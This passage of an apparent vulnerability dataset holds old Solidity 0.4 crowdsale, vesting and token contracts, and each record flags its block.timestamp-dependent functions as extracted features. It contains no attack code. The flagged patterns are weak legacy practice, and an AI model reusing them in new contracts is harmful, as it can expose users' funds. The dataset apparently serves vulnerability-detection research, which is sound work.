roleName)\n view\n public\n {\n roles[roleName].check(addr);\n }\n function hasRole(address addr, string roleName)\n view\n public\n returns (bool)\n {\n return roles[roleName].has(addr);\n }\n function addRole(address addr, string roleName)\n internal\n {\n roles[roleName].add(addr);\n emit RoleAdded(addr, roleName);\n }\n function removeRole(address addr, string roleName)\n internal\n {\n roles[roleName].remove(addr);\n emit RoleRemoved(addr, roleName);\n }\n modifier onlyRole(string roleName)\n {\n checkRole(msg.sender, roleName);\n _;\n }\n}\ncontract Whitelist is Ownable, RBAC {\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n string public constant ROLE_WHITELISTED = \"whitelist\";\n modifier onlyWhitelisted() {\n checkRole(msg.sender, ROLE_WHITELISTED);\n _;\n }\n function addAddressToWhitelist(address addr)\n onlyOwner\n public\n {\n addRole(addr, ROLE_WHITELISTED);\n emit WhitelistedAddressAdded(addr);\n }\n function whitelist(address addr)\n public\n view\n returns (bool)\n {\n return hasRole(addr, ROLE_WHITELISTED);\n }\n function addAddressesToWhitelist(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n addAddressToWhitelist(addrs[i]);\n }\n }\n function removeAddressFromWhitelist(address addr)\n onlyOwner\n public\n {\n removeRole(addr, ROLE_WHITELISTED);\n emit WhitelistedAddressRemoved(addr);\n }\n function removeAddressesFromWhitelist(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n removeAddressFromWhitelist(addrs[i]);\n }\n }\n}\ncontract WhitelistedCrowdsale is Crowdsale, Ownable {\n Whitelist public whitelist;\n constructor (Whitelist _whitelist) public {\n require(_whitelist != address(0));\n whitelist = _whitelist;\n }\n modifier onlyWhitelisted(address _beneficiary) {\n require(whitelist.whitelist(_beneficiary));\n _;\n }\n function isWhitelisted(address _beneficiary) public view returns(bool) {\n return whitelist.whitelist(_beneficiary);\n }\n function changeWhitelist(Whitelist _whitelist) public onlyOwner {\n whitelist = _whitelist;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhitelisted(_beneficiary) {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract BlockFollowMainStageCrowdsale is StageCrowdsale, CappedStageCrowdsale, LimitedMinPurchaseCrowdsale,\n ManualTokenDistributionCrowdsale, PausableCrowdsale, RefundableStageCrowdsale, WhitelistedCrowdsale {\n using SafeMath for uint256;\n mapping (address => bool) public claimedBonus;\n uint256 public ratePerEth;\n uint256 public bonusTokensPool;\n uint256 public burnPercentage;\n uint256 public totalTokensSold;\n uint256 purchasableTokenSupply;\n constructor(\n address _wallet,\n ERC20 _token,\n uint256 _openingTime,\n StageCrowdsale _previousStage,\n uint256 _ratePerEth,\n uint256 _minPurchase,\n uint256 _minCap,\n uint256 _maxCap,\n uint256 _burnPercentage,\n uint256 _purchasableTokenSupply,\n Whitelist _whitelist\n )\n public\n CappedCrowdsale(_maxCap)\n LimitedMinPurchaseCrowdsale(_minPurchase)\n StageCrowdsale(_ratePerEth, _wallet, _token, _openingTime, _openingTime + 4 weeks, _previousStage)\n RefundableCrowdsale(_minCap)\n WhitelistedCrowdsale(_whitelist)\n {\n require(_ratePerEth > 0, \"Rate per ETH cannot be null\");\n require(_burnPercentage > 0, \"Burn percenatage cannot be null\");\n require(_purchasableTokenSupply > 0, \"Purchasable token supply cannot be null\");\n ratePerEth = _ratePerEth;\n burnPercentage = _burnPercentage;\n purchasableTokenSupply = _purchasableTokenSupply;\n }\n modifier canClaimBonus() {\n require(isFinalized, \"Cannot claim bonus when stage is not yet finalized\");\n require(now < openingTime + 6 weeks, \"Cannot claim bonus tokens too soon\");\n require(!claimedBonus[msg.sender], \"Cannot claim bonus tokens repeatedly\");\n require(totalTokensSold > 0, \"Cannot claim bonus tokens when no purchase have been made\");\n _;\n }\n function claimBonusTokens() public canClaimBonus {\n uint256 senderBalance = token.balanceOf(msg.sender);\n uint256 purchasedProportion = senderBalance.mul(1e18).div(totalTokensSold);\n uint256 bonusForSender = bonusTokensPool.mul(purchasedProportion).div(1e18);\n token.transfer(msg.sender, bonusForSender);\n claimedBonus[msg.sender] = true;\n }\n function claimRemainingTokens() public onlyOwner {\n uint256 balance = token.balanceOf(this);\n manualSendTokens(msg.sender, balance);\n }\n function finalization() internal {\n super.finalization();\n uint256 balance = token.balanceOf(address(this));\n totalTokensSold = purchasableTokenSupply.sub(balance);\n uint256 balanceToBurn = balance.mul(burnPercentage).div(100);\n BurnableToken(address(token)).burn(balanceToBurn);\n uint256 bonusPercentage = 100 - burnPercentage;\n bonusTokensPool = balance.mul(100).mul(bonusPercentage).div(1e4);\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.div(1e10).mul(ratePerEth);\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f04"
  },
  "filename": "6059.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n constructor(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _deliverTokens(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _getTokenAmount(uint256 _weiAmount)\n internal view returns (uint256)\n {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n constructor(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n onlyWhileOpen\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract FinalizableCrowdsale is TimedCrowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasClosed());\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract StageCrowdsale is FinalizableCrowdsale {\n bool public previousStageIsFinalized = false;\n StageCrowdsale public previousStage;\n constructor(\n uint256 _rate,\n address _wallet,\n ERC20 _token,\n uint256 _openingTime,\n uint256 _closingTime,\n StageCrowdsale _previousStage\n )\n public\n Crowdsale(_rate, _wallet, _token)\n TimedCrowdsale(_openingTime, _closingTime)\n {\n previousStage = _previousStage;\n if (_previousStage == address(0)) {\n previousStageIsFinalized = true;\n }\n }\n modifier isNotFinalized() {\n require(!isFinalized, \"Call on finalized.\");\n _;\n }\n modifier previousIsFinalized() {\n require(isPreviousStageFinalized(), \"Call on previous stage finalized.\");\n _;\n }\n function finalizeStage() public onlyOwner isNotFinalized {\n _finalizeStage();\n }\n function proxyBuyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(tx.origin, _beneficiary, weiAmount, tokens);\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function isPreviousStageFinalized() public returns (bool) {\n if (previousStageIsFinalized) {\n return true;\n }\n if (previousStage.isFinalized()) {\n previousStageIsFinalized = true;\n }\n return previousStageIsFinalized;\n }\n function _finalizeStage() internal isNotFinalized {\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal isNotFinalized previousIsFinalized {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n constructor(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function capReached() public view returns (bool) {\n return weiRaised >= cap;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(weiRaised.add(_weiAmount) <= cap);\n }\n}\ncontract CappedStageCrowdsale is CappedCrowdsale, StageCrowdsale {\n using SafeMath for uint256;\n function weiToCap() public view returns (uint256) {\n return cap.sub(weiRaised);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._postValidatePurchase(_beneficiary, _weiAmount);\n if (weiRaised >= cap) {\n _finalizeStage();\n }\n }\n}\ncontract TokensSoldCountingCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public tokensSoldCount;\n function _updatePurchasingState(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n uint256 tokens = _getTokenAmount(_weiAmount);\n tokensSoldCount = tokensSoldCount.add(tokens);\n }\n}\ncontract ManualTokenDistributionCrowdsale is Crowdsale, Ownable, TokensSoldCountingCrowdsale {\n using SafeMath for uint256;\n event TokenAssignment(address indexed beneficiary, uint256 amount);\n function manualSendTokens(address _beneficiary, uint256 _tokensAmount) public onlyOwner {\n require(_beneficiary != address(0));\n require(_tokensAmount > 0);\n super._deliverTokens(_beneficiary, _tokensAmount);\n tokensSoldCount = tokensSoldCount.add(_tokensAmount);\n emit TokenAssignment(_beneficiary, _tokensAmount);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract PausableCrowdsale is Crowdsale, Pausable {\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal whenNotPaused {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract TokensRollStageCrowdsale is FinalizableCrowdsale {\n address public rollAddress;\n modifier havingRollAddress() {\n require(rollAddress != address(0), \"Call when no roll address set.\");\n _;\n }\n function finalization() internal havingRollAddress {\n super.finalization();\n token.transfer(rollAddress, token.balanceOf(this));\n }\n function setRollAddress(address _rollAddress) public onlyOwner {\n require(_rollAddress != address(0), \"Call with invalid _rollAddress.\");\n rollAddress = _rollAddress;\n }\n}\nlibrary Roles {\n struct Role {\n mapping (address => bool) bearer;\n }\n function add(Role storage role, address addr)\n internal\n {\n role.bearer[addr] = true;\n }\n function remove(Role storage role, address addr)\n internal\n {\n role.bearer[addr] = false;\n }\n function check(Role storage role, address addr)\n view\n internal\n {\n require(has(role, addr));\n }\n function has(Role storage role, address addr)\n view\n internal\n returns (bool)\n {\n return role.bearer[addr];\n }\n}\ncontract RBAC {\n using Roles for Roles.Role;\n mapping (string => Roles.Role) private roles;\n event RoleAdded(address addr, string roleName);\n event RoleRemoved(address addr, string roleName);\n function checkRole(address addr, string roleName)\n view\n public\n {\n roles[roleName].check(addr);\n }\n function hasRole(address addr, string roleName)\n view\n public\n returns (bool)\n {\n return roles[roleName].has(addr);\n }\n function addRole(address addr, string roleName)\n internal\n {\n roles[roleName].add(addr);\n emit RoleAdded(addr, roleName);\n }\n function removeRole(address addr, string roleName)\n internal\n {\n roles[roleName].remove(addr);\n emit RoleRemoved(addr, roleName);\n }\n modifier onlyRole(string roleName)\n {\n checkRole(msg.sender, roleName);\n _;\n }\n}\ncontract Whitelist is Ownable, RBAC {\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n string public constant ROLE_WHITELISTED = \"whitelist\";\n modifier onlyWhitelisted() {\n checkRole(msg.sender, ROLE_WHITELISTED);\n _;\n }\n function addAddressToWhitelist(address addr)\n onlyOwner\n public\n {\n addRole(addr, ROLE_WHITELISTED);\n emit WhitelistedAddressAdded(addr);\n }\n function whitelist(address addr)\n public\n view\n returns (bool)\n {\n return hasRole(addr, ROLE_WHITELISTED);\n }\n function addAddressesToWhitelist(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n addAddressToWhitelist(addrs[i]);\n }\n }\n function removeAddressFromWhitelist(address addr)\n onlyOwner\n public\n {\n removeRole(addr, ROLE_WHITELISTED);\n emit WhitelistedAddressRemoved(addr);\n }\n function removeAddressesFromWhitelist(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n removeAddressFromWhitelist(addrs[i]);\n }\n }\n}\ncontract WhitelistedCrowdsale is Crowdsale, Ownable {\n Whitelist public whitelist;\n constructor (Whitelist _whitelist) public {\n require(_whitelist != address(0));\n whitelist = _whitelist;\n }\n modifier onlyWhitelisted(address _beneficiary) {\n require(whitelist.whitelist(_beneficiary));\n _;\n }\n function isWhitelisted(address _beneficiary) public view returns(bool) {\n return whitelist.whitelist(_beneficiary);\n }\n function changeWhitelist(Whitelist _whitelist) public onlyOwner {\n whitelist = _whitelist;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhitelisted(_beneficiary) {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n constructor(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n emit Closed();\n wallet.transfer(address(this).balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n emit RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n emit Refunded(investor, depositedValue);\n }\n}\ncontract RefundableCrowdsale is FinalizableCrowdsale {\n using SafeMath for uint256;\n uint256 public goal;\n RefundVault public vault;\n constructor(uint256 _goal) public {\n require(_goal > 0);\n vault = new RefundVault(wallet);\n goal = _goal;\n }\n function claimRefund() public {\n require(isFinalized);\n require(!goalReached());\n vault.refund(msg.sender);\n }\n function goalReached() public view returns (bool) {\n return weiRaised >= goal;\n }\n function finalization() internal {\n if (goalReached()) {\n vault.close();\n } else {\n vault.enableRefunds();\n }\n super.finalization();\n }\n function _forwardFunds() internal {\n vault.deposit.value(msg.value)(msg.sender);\n }\n}\ncontract BlockFollowPreSaleStageCrowdsale is StageCrowdsale, CappedStageCrowdsale, TokensRollStageCrowdsale,\n ManualTokenDistributionCrowdsale, PausableCrowdsale, WhitelistedCrowdsale {\n uint256 public ratePerEth;\n constructor(\n address _wallet,\n ERC20 _token,\n uint256 _openingTime,\n uint256 _ratePerEth,\n uint256 _maxCap,\n Whitelist _whitelist\n )\n public\n CappedCrowdsale(_maxCap)\n StageCrowdsale(_ratePerEth, _wallet, _token, _openingTime, _openingTime + 2 weeks, StageCrowdsale(address(0)))\n WhitelistedCrowdsale(_whitelist)\n {\n require(_ratePerEth > 0, \"Rate per ETH cannot be null\");\n ratePerEth = _ratePerEth;\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.div(1e10).mul(ratePerEth);\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f05"
  },
  "filename": "6065.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint256 public releaseTime;\n constructor(\n ERC20Basic _token,\n address _beneficiary,\n uint256 _releaseTime\n )\n public\n {\n require(_releaseTime > block.timestamp);\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(block.timestamp >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\npragma solidity ^0.4.23;\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\ncontract InitialTokenDistribution is Ownable {\n using SafeMath for uint256;\n ERC20 public token;\n mapping (address => TokenVesting) public vested;\n mapping (address => TokenTimelock) public timelocked;\n mapping (address => uint256) public initiallyDistributed;\n bool public initialDistributionDone = false;\n modifier onInitialDistribution() {\n require(!initialDistributionDone);\n _;\n }\n constructor(ERC20 _token) public {\n token = _token;\n }\n function initialDistribution() internal;\n function totalTokensDistributed() public view returns (uint256);\n function processInitialDistribution() onInitialDistribution onlyOwner public {\n initialDistribution();\n initialDistributionDone = true;\n }\n function initialTransfer(address to, uint256 amount) onInitialDistribution public {\n require(to != address(0));\n initiallyDistributed[to] = amount;\n token.transferFrom(msg.sender, to, amount);\n }\n function vest(address to, uint256 amount, uint256 releaseStart, uint256 cliff, uint256 duration) onInitialDistribution public {\n require(to != address(0));\n vested[to] = new TokenVesting(to, releaseStart, cliff, duration, false);\n token.transferFrom(msg.sender, vested[to], amount);\n }\n function lock(address to, uint256 amount, uint256 releaseTime) onInitialDistribution public {\n require(to != address(0));\n timelocked[to] = new TokenTimelock(token, to, releaseTime);\n token.transferFrom(msg.sender, address(timelocked[to]), amount);\n }\n}\ncontract DetailedERC20 is ERC20 {\n string public name;\n string public symbol;\n uint8 public decimals;\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n}\ncontract BlockFollowInitialTokenDistribution is InitialTokenDistribution {\n uint256 public reservedTokensFunctionality;\n uint256 public reservedTokensTeam;\n address functionalityWallet;\n address teamWallet;\n constructor(\n DetailedERC20 _token,\n address _functionalityWallet,\n address _teamWallet\n )\n public\n InitialTokenDistribution(_token)\n {\n functionalityWallet = _functionalityWallet;\n teamWallet = _teamWallet;\n uint8 decimals = _token.decimals();\n reservedTokensFunctionality = 80e6 * (10 ** uint256(decimals));\n reservedTokensTeam = 10e6 * (10 ** uint256(decimals));\n }\n function initialDistribution() internal {\n initialTransfer(functionalityWallet, reservedTokensFunctionality);\n initialTransfer(teamWallet, reservedTokensTeam);\n }\n function totalTokensDistributed() public view returns (uint256) {\n return reservedTokensFunctionality + reservedTokensTeam;\n }\n}",
  "extract_feature": [
    "function release() public {\nrequire(block.timestamp >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}",
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f06"
  },
  "filename": "613.sol",
  "content": "pragma solidity 0.4.24;\ncontract SnooKarma {\n address public oracle;\n address public maintainer;\n address public owner;\n mapping(address => uint) public balanceOf;\n mapping(address => mapping (address => uint)) public allowance;\n string public constant symbol = \"SNK\";\n string public constant name = \"SnooKarma\";\n uint8 public constant decimals = 2;\n uint public totalSupply = 0;\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n event Redeem(string indexed username, address indexed addr, uint karma);\n mapping(string => uint) redeemedKarma;\n constructor() public {\n owner = msg.sender;\n maintainer = msg.sender;\n oracle = msg.sender;\n }\n function transfer(address destination, uint amount) public returns (bool success) {\n if (balanceOf[msg.sender] >= amount &&\n balanceOf[destination] + amount > balanceOf[destination]) {\n balanceOf[msg.sender] -= amount;\n balanceOf[destination] += amount;\n emit Transfer(msg.sender, destination, amount);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom (\n address from,\n address to,\n uint amount\n ) public returns (bool success) {\n if (balanceOf[from] >= amount &&\n allowance[from][msg.sender] >= amount &&\n balanceOf[to] + amount > balanceOf[to])\n {\n balanceOf[from] -= amount;\n allowance[from][msg.sender] -= amount;\n balanceOf[to] += amount;\n emit Transfer(from, to, amount);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint amount) public returns (bool success) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n function safeAdd(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n require(c >= a);\n return c;\n }\n modifier onlyBy(address account) {\n require(msg.sender == account);\n _;\n }\n function transferOwnership(address newOwner) public onlyBy(owner) {\n require(newOwner != address(0));\n owner = newOwner;\n }\n function changeOracle(address newOracle) public onlyBy(owner) {\n require(oracle != address(0) && newOracle != address(0));\n oracle = newOracle;\n }\n function removeOracle() public onlyBy(owner) {\n oracle = address(0);\n }\n function changeMaintainer(address newMaintainer) public onlyBy(owner) {\n maintainer = newMaintainer;\n }\n function redeem(string username, uint karma, uint sigExp, uint8 sigV, bytes32 sigR, bytes32 sigS) public {\n require(\n ecrecover(\n keccak256(abi.encodePacked(this, username, karma, sigExp)),\n sigV, sigR, sigS\n ) == oracle\n );\n require(block.timestamp < sigExp);\n require(karma > redeemedKarma[username]);\n uint newUserKarma = karma - redeemedKarma[username];\n balanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], newUserKarma);\n uint newMaintainerKarma = newUserKarma / 100;\n balanceOf[maintainer] = safeAdd(balanceOf[maintainer], newMaintainerKarma);\n totalSupply = safeAdd(totalSupply, safeAdd(newUserKarma, newMaintainerKarma));\n redeemedKarma[username] = karma;\n emit Redeem(username, msg.sender, newUserKarma);\n }\n function redeemedKarmaOf(string username) public view returns(uint) {\n return redeemedKarma[username];\n }\n function() public payable { }\n function transferEthereum(uint amount, address destination) public onlyBy(maintainer) {\n require(destination != address(0));\n destination.transfer(amount);\n }\n function transferTokens(address token, uint amount, address destination) public onlyBy(maintainer) {\n require(destination != address(0));\n SnooKarma tokenContract = SnooKarma(token);\n tokenContract.transfer(destination, amount);\n }\n}",
  "extract_feature": [
